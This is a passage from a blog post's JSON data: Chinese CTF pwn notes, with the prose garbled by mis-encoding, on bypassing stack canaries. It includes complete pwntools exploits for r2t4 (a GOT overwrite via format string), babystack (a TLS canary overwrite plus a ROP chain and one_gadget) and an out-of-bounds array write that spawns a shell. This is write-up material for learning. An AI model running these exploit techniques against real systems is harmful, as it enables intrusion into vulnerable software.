= ELF(<span class=\"string\">&#x27;r2t4&#x27;</span>)</span><br><span class=\"line\">back_door = <span class=\"number\">0x400626</span></span><br><span class=\"line\">__stack_chk_fail_got = elf.got[<span class=\"string\">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class=\"line\">payload = <span class=\"string\">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(__stack_chk_fail_got+<span class=\"number\">2</span>) + p64(__stack_chk_fail_got)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ä¿®æ”¹TLSç»“æ„ä½“\"><a href=\"#ä¿®æ”¹TLSç»“æ„ä½“\" class=\"headerlink\" title=\"ä¿®æ”¹TLSç»“æ„ä½“\"></a>ä¿®æ”¹TLSç»“æ„ä½“</h1><p>å¦‚æœæˆ‘ä»¬æº¢å‡ºçš„è¶³å¤Ÿå¤§ï¼Œå¤§åˆ°èƒ½å¤Ÿè¦†ç›–åˆ°fs/gså¯„å­˜å™¨å¯¹åº”åç§»ä½çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹canaryä¸ºæˆ‘ä»¬è®¾è®¡å¥½çš„å€¼ï¼Œè¿™æ ·åœ¨ç¨‹åºæ£€æµ‹æ—¶å°±ä¼šå’Œæˆ‘ä»¬åŒ¹é…çš„å€¼è¿›è¡Œæ£€æµ‹ï¼Œä»è€Œç»•è¿‡canaryä¿æŠ¤ã€‚åœ¨åˆå§‹åŒ–canaryæ—¶ï¼Œfså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®æ˜¯TLSç»“æ„ä½“ï¼Œè€ŒfsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»çš„ä½ç½®å–å‡ºæ¥çš„canaryå°±åœ¨TLSç»“æ„ä½“é‡Œé¢ã€‚</p>\n<p>TLSç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/7dNV3AXJC6ynz2g.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/11/EsNG6xdMYQTBjVS.png\" alt=\"image.png\"></p>\n<h2 id=\"CTF2018-babystack\"><a href=\"#CTF2018-babystack\" class=\"headerlink\" title=\"CTF2018 babystack\"></a>CTF2018 babystack</h2><p>æ‹–è¿›IDAé‡Œé¢</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/PkfG3jSVb6FIJvi.png\" alt=\"image.png\"></p>\n<p>å­è¿›ç¨‹é‡Œé¢å…ˆè®©ç”¨æˆ·è¾“å…¥è¦è¾“å…¥çš„å¤§å°ï¼Œå¦‚æœå¤§äº0x1000å°±è¾“å‡ºè¿”å›ä¸è¿›è¡Œè¯»å–ï¼Œå¦‚æœå°äºç­‰äºå°±è¿›è¡Œè¯»å–</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/i5YWcHAQaD97rI6.png\" alt=\"image.png\"></p>\n<p>sçš„å¤§å°æ˜¯0x1010æ¯”0x10000å°æ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œæº¢å‡ºåˆ°TLSä¿®æ”¹canaryï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šcanaryçš„ä½ç½®</p>\n<p>è¿™é‡Œæˆ‘é‡‡å–çˆ†ç ´ï¼Œä¸æ–­å°è¯•è·å¾—canaryçš„ä½ç½®ã€‚å…ˆæ„å»ºå¥½ROPé“¾ï¼Œæ§åˆ¶ç¨‹åºè¿”å›åˆ°ä¸»å‡½æ•°ï¼Œè¿™æ ·è‚¯å®šä¼šè¢«æ£€æµ‹åˆ°å¼‚å¸¸é€€å‡ºï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¸æ–­åŠ é•¿ROPé“¾ç›´åˆ°è¦†ç›–TLSå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/t5pbuLRJqA6XefV.png\" alt=\"image.png\"></p>\n<p>ç¡®å®šå¥½ä½ç½®ä»¥åå°±å¯ä»¥å¼€å§‹æ„é€ ROPé“¾ï¼Œæ³„éœ²åœ°å€putså‡½æ•°çš„åœ°å€ï¼Œè®¡ç®—å‡ºlibcbaseï¼Œæœ€ååˆ©ç”¨æ ˆè¿ç§»ï¼Œå†™one_gadget</p>\n<p>è·å–gadgets</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/M7UkG6wZ1cfToDs.png\" alt=\"image.png\"></p>\n<p>ä¹‹åæ„é€ ROPé“¾</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1010</span> </span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(puts_got)</span><br><span class=\"line\">payload += p64(puts_plt)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(pop_rsi_r15_ret)</span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(read_plt)</span><br><span class=\"line\">payload += p64(leave_ret)</span><br><span class=\"line\">payload += <span class=\"string\">&#x27;a&#x27;</span>*(offset - <span class=\"built_in\">len</span>(payload))</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)è¾“å‡ºputsçš„åœ°å€</li>\n<li>p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(fakestack)+p64(0)+p64(read_plt)ç»„è£…readå‡½æ•°å‘fakestackå†™ä¸œè¥¿</li>\n</ol>\n<p>è·å–one_gadget</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/LTidqfcgkxtvQjR.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./babystack&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;babystack&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"number\">0x4009E7</span></span><br><span class=\"line\">offset = <span class=\"number\">6128</span></span><br><span class=\"line\">bss_start = elf.bss()</span><br><span class=\"line\">fakestack = bss_start + <span class=\"number\">0x100</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x400c03</span></span><br><span class=\"line\">pop_rsi_r15_ret = <span class=\"number\">0x400c01</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x400955</span></span><br><span class=\"line\">read_plt = elf.symbols[<span class=\"string\">&quot;read&quot;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_libc = libc.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">read_plt = elf.symbols[<span class=\"string\">&quot;read&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;send?&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1010</span> </span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(puts_got)</span><br><span class=\"line\">payload += p64(puts_plt)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(pop_rsi_r15_ret)</span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(read_plt)</span><br><span class=\"line\">payload += p64(leave_ret)</span><br><span class=\"line\">payload += <span class=\"string\">&#x27;a&#x27;</span>*(offset - <span class=\"built_in\">len</span>(payload))</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;goodbye.\\n&quot;</span>)</span><br><span class=\"line\">puts_addr = u64(p.recv()[:<span class=\"number\">6</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(puts_addr)</span><br><span class=\"line\">getshell_libc = <span class=\"number\">0x4527a</span> <span class=\"comment\">#0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class=\"line\">base_addr = puts_addr - puts_libc</span><br><span class=\"line\">one_gadget = base_addr + getshell_libc</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = p64(<span class=\"number\">0x12345678</span>)</span><br><span class=\"line\">payload2 += p64(one_gadget)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://s2.loli.net/2021/12/11/KPtpvlnfT7X3cIm.png\" alt=\"image.png\"></p>\n<h1 id=\"æ•°ç»„ä¸‹æ ‡è¶Šç•Œ\"><a href=\"#æ•°ç»„ä¸‹æ ‡è¶Šç•Œ\" class=\"headerlink\" title=\"æ•°ç»„ä¸‹æ ‡è¶Šç•Œ\"></a>æ•°ç»„ä¸‹æ ‡è¶Šç•Œ</h1><p>å½“ç¨‹åºä¸­å­˜åœ¨æ•°ç»„ï¼Œæ²¡æœ‰å¯¹è¾¹ç•Œè¿›è¡Œæ£€æŸ¥æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å¯¹æ•°ç»„è¿›è¡Œå¯¹åº”ä½ç½®ä¿®æ”¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡canaryæ£€æµ‹ï¼Œç›´æ¥ä¿®æ”¹è¿”å›åœ°å€</p>\n<p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹arræ•°ç»„ä»»æ„ä½ç½®è¿›è¡Œä¿®æ”¹ï¼Œè¿™å°±å­˜åœ¨æ•°ç»„ä¸‹æ ‡æº¢å‡ºï¼Œä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œè¿”å›åœ°å€åœ¨æ•°ç»„ä¸­å°±ç›¸å½“äºarr[6]ï¼Œå¦‚æœæˆ‘ä»¬å¯¹arr[6]è¿›è¡Œä¿®æ”¹å°±æ˜¯å¯¹è¿”å›åœ°å€è¿›è¡Œä¿®æ”¹</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/zmgNVKvaqhUBpnl.png\" alt=\"image.png\"></p>\n<h2 id=\"homework\"><a href=\"#homework\" class=\"headerlink\" title=\"homework\"></a>homework</h2><p>ç›´æ¥è¿›IDAé‡Œé¢è§‚å¯Ÿï¼Œå‘ç°å­˜åœ¨åé—¨å‡½æ•°</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/96yP8cAto4dxKpi.png\" alt=\"image.png\"></p>\n<p>ç»§ç»­åˆ†æ</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/CoN237cMFXpEmvw.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œæ²¡æœ‰å¯¹æ•°ç»„è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¿®æ”¹è¿”å›åœ°å€ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾è¿”å›åœ°å€å¯¹åº”ä½ç½®</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/lL3sqS89Ognyoev.png\" alt=\"image.png\"></p>\n<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†arr[14]ä¿®æ”¹æˆåé¢å‡½æ•°åœ°å€å³å¯æ‹¿åˆ°shell</p>\n<h2 id=\"EXP-5\"><a href=\"#EXP-5\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;gnome-terminal&#x27;</span>,<span class=\"string\">&#x27;-x&#x27;</span>,<span class=\"string\">&#x27;bash&#x27;</span>,<span class=\"string\">&#x27;-c&#x27;</span>]</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./homework&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./homework&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;aaaa&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;4 &gt; dump all numbers&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot; &gt; &quot;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index to edit: &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;14&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;How many? &quot;</span>)</span><br><span class=\"line\">system_addr = <span class=\"number\">0x080485FB</span></span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(system_addr))</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://s2.loli.net/2021/12/11/puVWbNdHeQOwv4K.png\" alt=\"image.png\"></p>\n","text":"æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ ç®€ä»‹canaryä¿æŠ¤åˆç§°é‡‘ä¸é›€ä¿æŠ¤ï¼Œä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢æ ˆæº¢å‡ºçš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚å·¥ä½œåŸç†æ˜¯ä»fs/gså¯„å­˜å™¨å–å€¼æ”¾åœ¨rbp-4æˆ–è€…rbp-8çš„ä½ç½®ï¼ˆ32ä½/64ä½ï¼‰ï¼Œå½“ç”¨æˆ·è¾“å…¥ç»“æŸåï¼Œç¨‹åºä¼šä»rbp-4æˆ–è€…rbp-8çš„ä½ç½®å–å‡ºå¹¶ä¸fs/gså¯„å­˜å™¨å¯¹åº”ä½ç½®çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"pwn","slug":"pwn","count":3,"path":"api/categories/pwn.json"}],"tags":[{"name":"ç¬”è®°","slug":"ç¬”è®°","count":3,"path":"api/tags/ç¬”è®°.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">ç®€ä»‹</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#leak%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">leakç»•è¿‡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stackguard1\"><span class=\"toc-text\">stackguard1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#one-by-one%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">one by oneçˆ†ç ´</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bin1\"><span class=\"toc-text\">bin1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ssp%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">sspæ”»å‡»</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#smashes\"><span class=\"toc-text\">smashes</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8A%AB%E6%8C%81-stack-chk-fail\"><span class=\"toc-text\">åŠ«æŒ___stack_chk_fail</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-r2t4\"><span class=\"toc-text\">[BJDCTF 2nd]r2t4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9TLS%E7%BB%93%E6%9E%84%E4%BD%93\"><span class=\"toc-text\">ä¿®æ”¹TLSç»“æ„ä½“</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTF2018-babystack\"><span class=\"toc-text\">CTF2018 babystack</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C\"><span class=\"toc-text\">æ•°ç»„ä¸‹æ ‡è¶Šç•Œ</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#homework\"><span class=\"toc-text\">homework</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-5\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T23:24:05.390Z","comments":true,"path":"api/articles/è¥¿æ¹–è®ºå‰‘pwnå¤ç°.json","keywords":null,"cover":"https://i.loli.net/2021/11/23/3mXuv9PTqLHU726.jpg","text":" ç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“ blindå¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰ æˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","updated":"2021-11-06T02:20:32.088Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/ctwdE4PqChNIpzb.jpg","text":"pwn03å°†é™„ä»¶æ‹–è¿›IDAä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠsystemå‡½æ•°ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ æ‰€ä»¥å‡½æ•°åœ°å€æ³„éœ²è·å¾—libcç‰ˆæœ¬æ¥è·å¾—systemå‡½æ•°åœ°å€ä»è€Œè·å¾—shellã€‚å…·ä½“æ­¥éª¤ï¼š æ³„éœ² putsåœ°å€ è·å– libc ç‰ˆæœ¬ è·å– system åœ°å€ä¸ /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","count":6,"path":"api/categories/åˆ·é¢˜.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}